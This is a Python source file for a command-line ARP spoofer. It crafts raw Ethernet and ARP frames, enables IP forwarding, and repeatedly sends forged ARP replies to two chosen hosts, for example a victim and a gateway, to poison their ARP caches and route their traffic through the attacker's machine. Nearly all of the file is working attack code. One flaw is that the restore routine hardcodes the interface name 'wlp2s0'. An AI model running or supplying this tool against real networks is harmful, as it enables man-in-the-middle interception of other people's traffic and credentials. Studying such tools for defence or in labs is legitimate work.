#!/usr/bin/env python3
import argparse
import binascii
import logging
import re
import socket
import struct
import sys
import time


__author__ = "pacmanator"
__email__ = "mrpacmanator at gmail dot com"
__version__ = "v1.0"


logging.basicConfig(format="[%(levelname)s] %(message)s", level=logging.INFO)


class Ethernet:
	""" Creates an Ethernet frame. """

	def __init__(self, dst, src, proto=0x0806):
		"""
		Sets the necesary values of the Ethernet frame.
		@param dst: Destination MAC Address.
		@param src: Source MAC Address.
		@param proto: Packet protocol (Default ARP=0x0806).
		"""
		self.dst = self._set_mac_address(dst)
		self.src = self._set_mac_address(src)
		self._proto = struct.pack("!H", proto)

	def _set_mac_address(self, mac_addr):
		"""
			Returns a byte encoded MAC Address if it's a string, otherwise sets its value.
		"""
		return self.encode_mac_address(mac_addr) if (mac_addr is not None) and \
		                                            (not isinstance(mac_addr, bytes)) else mac_addr

	@staticmethod
	def decode_mac_address(raw_mac_addr):
		"""
			Returns a readable MAC address.
			@param raw_mac_addr: Bytes encoded MAC Address.
		"""
		mac_addr = binascii.hexlify(raw_mac_addr)

		# Splits the mac variable in six pieces, each of two values,
		# then returns it as a 'normal' MAC Address.
		# Like this -> 000000000000->['00', '00', '00', '00', '00', '00']->00:00:00:00:00:00
		return ":".join([mac_addr[inx:inx + 2].decode() for inx in range(0, len(mac_addr), 2)])

	@staticmethod
	def is_valid_mac_address(mac_addr):
		"""
			Returns True if the provided MAC address matches the form 'ff:ff:ff:ff:ff:ff',
			otherwise, blows up.
		"""
		# MAC address pattern.
		mac_regx = "(([a-fA-F]|[0-9]){1,2}:){1,5}([a-fA-F]|[0-9]){1,2}"
		# Compile regular expression
		regex = re.compile(mac_regx)

		return re.fullmatch(regex, mac_addr) and len(mac_addr) == 17

	@staticmethod
	def encode_mac_address(mac_addr):
		""" Transforms a string MAC Address to it's bytes form. """
		if not Ethernet.is_valid_mac_address(mac_addr):
			print("Invalid MAC address:", mac_addr, file=sys.stderr)
			sys.exit()

		# Returns a 'bytes' MAC address (\xff\xff\xff\xff\xff\xff)
		return binascii.unhexlify(mac_addr.replace(":", ""))

	def __str__(self):
		"""
			Return a string representation of the Ethernet packet.
		"""
		return "Dst MAC: {0} Src MAC: {1} Proto: 0x{2}".format(self.decode_mac_address(self.dst),
		                                                       self.decode_mac_address(self.src),
		                                                       binascii.hexlify(self._proto).decode())

	def __bytes__(self):
		"""
			Returns a bytes representation of the ethernet frame.
		"""
		return self.dst + self.src + self._proto

	def __add__(self, other):
		"""
			Adds the Ethernet Frame bytes with another bytes sequence.
			@param other: The other bytes sequence.
		"""
		return bytes(self) + bytes(other)


class ARP:
	""" Creates an ARP packet. """
	def __init__(self, src_mac, source_ip, dest_mac, dest_ip, opcode=0x0001):
		""" Sets the packet values.
		@param sMAC: Origin MAC address.
		@param sIP: Origin IP address.
		@param dMAC: Destination MAC address.
		@param dIP: Destination IP address.
		@param opcode: Type of operation to be performed, 1 for request and 2 for reply.
		"""
		# ARP packet first half.
		self._hwtype = 0x001
		self._pType = 0x0800
		self._hwsize = 0x06
		self._psize = 0x04
		self._opcode = opcode

		# If it's not a string Object, encode it.
		self.src_mac = Ethernet.encode_mac_address(src_mac) if not isinstance(src_mac, bytes) else src_mac
		self.dest_mac = Ethernet.encode_mac_address(dest_mac) if not isinstance(dest_mac, bytes) else dest_mac

		# Encode the provided IP address to a bytes-like.
		self.source_ip = socket.inet_aton(source_ip)
		self.dest_ip = socket.inet_aton(dest_ip)

	def __str__(self):
		"""
			Return a string representation of an ARP packet.
		"""
		f_half = "hwType: {0} pType: 0x{1:x} hwSize: {2} pSize: {3} opcode: {4}".format(self._hwtype,
		                                                                                self._pType,
		                                                                                self._hwsize,
		                                                                                self._psize,
		                                                                                self._opcode)

		s_half = "sMAC: {0} dMAC: {1} sIP: {2} dIP: {3}".format(Ethernet.decode_mac_address(self.src_mac),
		                                                        Ethernet.decode_mac_address(self.dest_mac),
		                                                        socket.inet_ntoa(self.source_ip),
		                                                        socket.inet_ntoa(self.dest_ip))
		return "{0}\n{1}".format(f_half, s_half)

	def __bytes__(self):
		"""
			Return a bytes representaion of the packet.
		"""
		up = struct.pack("!HHBBH", self._hwtype, self._pType, self._hwsize, self._psize, self._opcode)
		return up + self.src_mac + self.source_ip + self.dest_mac + self.dest_ip


def get_interface_mac_addr(iface):
	""" Get the MAC Address of the provided interface. """
	try:
		with open("/sys/class/net/{0:s}/address".format(iface), "r") as file:
			# Returns the MAC address without the '\n'.
			return file.readline()[:-1]

	except FileNotFoundError as f:
		logging.error("{0:s}: {1:s}".format(f.strerror, f.filename))
		sys.exit(f.errno)


def can_change_ipf_status(status):
	"""
		Check the status of the ip_forward file. If it's different than the provided status, return True.
		@param status: 1 or 0.
	"""
	with open("/proc/sys/net/ipv4/ip_forward") as file:
		return file.readline() != (str(status) + '\n')


def change_ip_forwarding(status):
	"""
		Change the status of the ipv4 ip_forward file
		@param status: 1 for ON and 0 for OFF.
	"""
	try:
		if not can_change_ipf_status(status):
			return False

		with open("/proc/sys/net/ipv4/ip_forward", 'w') as file:
			logging.info("Changing IP forwarding status to {0}".format(status))
			file.write(status)

	except PermissionError as perm_err:
		logging.error("{0:s}: {1:s}. Check file permissions or if you are root.".format(perm_err.strerror, perm_err.filename))
		sys.exit(perm_err.errno)

	except Exception as error:
		logging.error(error)
		sys.exit(1)


def get_target_mac_address(target_ip, iface, src_ip, sock=None):
	"""
		Returns the (RAW) MAC address of the provided host.
		@param target_ip: IP address to get the MAC addres from.
		@param iface: Interface to use.
		@param src_ip: Source IP address.
		@param sock: Socket to use, if it's None, create a new socket.
	"""
	# Ethernet broadcast packet.
	eth = Ethernet(dst="ff:ff:ff:ff:ff:ff", src=get_interface_mac_addr(iface))

	# Create ARP packet.
	arp_packet = ARP(eth.src, src_ip, eth.encode_mac_address("00:00:00:00:00:00"), target_ip)

	packet = eth + arp_packet

	try:
		if sock is None:
			# Create a RAW socket.
			sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)
			sock.bind((iface, 0x0806))

		while True:
			sock.send(packet)
			recv = sock.recv(1024)

			# Check if the ARP opcode is a 'reply' type and if it matches with the provided IP address.
			if (recv[20:22] == b"\x00\x02") and (recv[0x1c:0x20] == arp_packet.dest_ip):
				return recv[0x16:0x1c]

			time.sleep(2)

	except KeyboardInterrupt:
		print("[*] User requested exit.")
		sys.exit(0)


def restore_arp(src_mac, src_ip, target_mac, target_ip, sock=None):
	"""
		Sends the ARP Original values.
		@param src_mac: Source MAC address.
		@param src_ip: Source IP address.
		@param target_mac: Destination MAC address.
		@param target_ip: Destination IP address.
		@param sock: Socket to use.
	"""
	try:
		if sock is None:
			sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)
			sock.bind(("wlp2s0", 0x0806))

		change_ip_forwarding("0")
		ethernet_packet = Ethernet(dst=target_mac, src=src_mac)

		arp_packet = ARP(src_mac, src_ip, target_mac, target_ip, opcode=0x0002)
		packet = ethernet_packet + arp_packet
		sock.send(packet)

	except OSError as os_err:
		logging.error("{0:s}".format(os_err.strerror))
		sys.exit(os_err.errno)

	except Exception as err:
		logging.error(err)
		sys.exit(1)


def spoof(iface, target1_ip, src_ip, target2_ip, intervals):
	"""
	Spoofs an IP Address with your MAC address.
		@param iface: Interface to use.
		@param target1_ip: Destination IP address.
		@param src_ip: Source IP address.
		@param target2_ip: IP to spoof.
		@param intervals: Seconds to send the next packet (Default 30).
	"""
	sock = None
	target1_mac, target2_mac = None, None
	src_mac = None

	try:
		change_ip_forwarding("1")
		sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)

		# Bind the socket to the provided interface and protocol.
		sock.bind((iface, 0x0806))

		src_mac = get_interface_mac_addr(iface)

		print("\033[1;32m[*]\033[0;0m Asking who-has ", target1_ip)
		target1_mac = get_target_mac_address(target1_ip, iface, src_ip, sock)
		print("\033[1;32m[*]\033[0;0m {0:s} is-at {1:s}".format(target1_ip, Ethernet.decode_mac_address(target1_mac)))

		print("\033[1;32m[*]\033[0;0m Asking who-has ", target2_ip)
		target2_mac = get_target_mac_address(target2_ip, iface, src_ip, sock)
		print("\033[1;32m[*]\033[0;0m {0:s} is-at {1:s}".format(target2_ip, Ethernet.decode_mac_address(target2_mac)))

		# Target 1 Packet.
		ethernet_packet1 = Ethernet(dst=target1_mac, src=src_mac)
		arp_packet1 = ARP(src_mac, target2_ip, target1_mac, target1_ip, opcode=0x0002)
		packet1 = ethernet_packet1 + arp_packet1

		# Target 2 packet.
		ethernet_packet2 = Ethernet(dst=target2_mac, src=src_mac)
		arp_packet2 = ARP(src_mac, target1_ip, target2_mac, target2_ip, opcode=0x0002)
		packet2 = ethernet_packet2 + arp_packet2

		while True:
			print("\033[1;34m[!]\033[0;0m Spoofing {0} with {1}->{2}".format(target1_ip, src_mac, target2_ip))
			sock.send(packet1)

			print("\033[1;34m[!]\033[0;0m Spoofing {0} with {1}->{2}".format(target2_ip, src_mac, target1_ip))
			sock.send(packet2)

			time.sleep(intervals)

	except KeyboardInterrupt:
		print("\n\033[1;31m[!]\033[0;0m User requested exit.\n")

	except Exception as genErr:
		logging.error(genErr)

	finally:
		if not ((target2_mac is None) and (target1_mac is None)):
			print("\033[1;36m[*]\033[0;0m Restoring ARP.")
			# Restore ARP table of the first target.
			restore_arp(target2_mac, target2_ip, target1_mac, target1_ip, sock)
			restore_arp(src_mac, src_ip, target1_mac, target1_ip)

			# Restore ARP table of the second target.
			restore_arp(target1_mac, target1_ip, target2_mac, target2_ip, sock)
			restore_arp(src_mac, src_ip, target2_mac, target2_ip)

		sock.close()
		sys.exit()


def main():
	parser = argparse.ArgumentParser(description="ARP spoofer", usage="arp_spoofer.py -i [interface] " +
	                                                                  "-t [targetIP] -s [spoofIP] [sourceIP]")
	parser.add_argument("source", help="Source IP address")

	parser.add_argument("-i", dest="iface", action="store", required=True,
	                    help="Interface")

	parser.add_argument("-t", dest="target1", action="store", required=True,
	                    help="Target IP", metavar="IP")

	parser.add_argument("-s", dest="target2", action="store", required=True,
	                    help="IP address to spoof (e.g The gateway)", metavar="IP")

	parser.add_argument("--interval", dest="interval", default=20, type=int,
	                    help="Intervals of seconds at which poison the target ARP cache.")

	args = parser.parse_args()

	spoof(args.iface, args.target1, args.source, args.target2, args.interval)


if __name__ == '__main__':
	main()
